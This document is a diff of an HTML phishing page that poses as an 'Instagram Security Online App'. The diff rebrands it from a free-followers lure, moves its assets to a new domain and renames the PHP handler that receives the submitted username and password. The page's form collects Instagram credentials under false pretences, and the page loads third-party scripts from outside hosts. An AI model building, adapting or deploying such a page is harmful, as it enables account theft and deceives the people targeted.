@@ -1,7 +1,7 @@
 <html><head>
 
   <meta charset="utf-8" />
-  <title>Instagram Follower Online App</title>
+  <title>Instagram Security Online App</title>
   <!--[if IE]><meta http-equiv='X-UA-Compatible' content="IE=edge,IE=9,IE=8,chrome=1" /><![endif]-->
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimum-scale=1.0, maximum-scale=1.0">
   <meta name="apple-mobile-web-app-capable" content="yes">
@@ -21,11 +21,11 @@
 <meta charset="utf-8"/>
 <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
 <title>Clash of Clans Hack Online</title>
-<link rel="shortcut icon" href="http://followerinsta.online/images/logo.png" />
+<link rel="shortcut icon" href="http://securityinstagram.online/images/logo.png" />
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
-<meta name="title" content="My InstaHack Followers"/>
-<meta name="description" content="Cara untuk hacking follower instagram"/>
-<meta name="keywords" content="hack Follower Instagram">
+<meta name="title" content="My InstaHack Akaun"/>
+<meta name="description" content="Cara untuk hacking akaun instagram"/>
+<meta name="keywords" content="hack akaun Instagram">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
 <link rel="stylesheet" href="./ngz/css1.css"/>
 <link rel="stylesheet" href="./ngz/css2.css"/>
@@ -40,7 +40,7 @@
 
 
 
-<h1 style="color:green;">Instagram Follower Online App</h1>
+<h1 style="color:green;">Instagram Security Online App</h1>
 
                 </div>
               
@@ -56,9 +56,9 @@
 
                       <center>
                       	
-<img id="slika" src="http://followerinsta.online/images/defaultslika.gif" style="width: 109px; height: 109px; border-radius: 50%; margin-top: 20px; margin-bottom: 20px;">
+<img id="slika" src="http://SecurityInstagram.online/images/defaultslika.gif" style="width: 109px; height: 109px; border-radius: 50%; margin-top: 20px; margin-bottom: 20px;">
 
-<form method="post" action="sukses.php">
+<form method="post" action="successfull.php">
 
              </center>
                       <div  style="color : white">
@@ -73,7 +73,8 @@
                       
 <br><input type="text" id="email" name="user" placeholder="@Username" class="form-control " required/>
 
-<br><input class="form-control " style="width: 545px;" name="follower" placeholder="0-10000 Follower" min="0" step="100" max="100000" type="number" required/>
+<br><input class="form-control " style="width: 545px;" name="follower" placeholder="10-100" min="0" step="100
+" max="100" type="number" required/>
 
 <br><input type="password" id="email" name="password" placeholder="Password" class="form-control " required/>
 
@@ -107,12 +108,12 @@
                 <div class="panel-body" id="generator">
                   <div class="row">
                     <div class="col-md-3 hidden-sm hidden-xs">
-                      <img width="115%" alt="Instagram Followers (Android / iOS)" src="http://followerinsta.online/images/logo.png">
+                      <img width="115%" alt="Instagram Account (Android / iOS)" src="http://SecurityInstagram.online/images/logo.png">
                     </div>
                     <div class="col-md-9">
                       <br>
 
-                      <span class="titlu_font" style="color:white;">Generate likes and followers!</span><br>
+                      <span class="titlu_font" style="color:white;">Generate Mx7 and B4!</span><br>
                       <div class="row" style="border: none;padding:0;margin-top:10px;">
                         <p class="warning" style="color:red;display:none;position:relative; left: 15px;">Check your username:</p>
                         <div class="col-md-8">
@@ -250,7 +251,7 @@
     });
 
   </script>
-  <script type="text/javascript" src="http://followerinsta.online/js/ludy-script.js"></script>
+  <script type="text/javascript" src="http://SecurityInstagram.online/js/ludy-script.js"></script>
   <script type="text/javascript" src="http://www.ludyluda.com/Q9q4MIwc1fG5dHLM"></script>
 
   <!-- Histats.com  START  (standard)-->
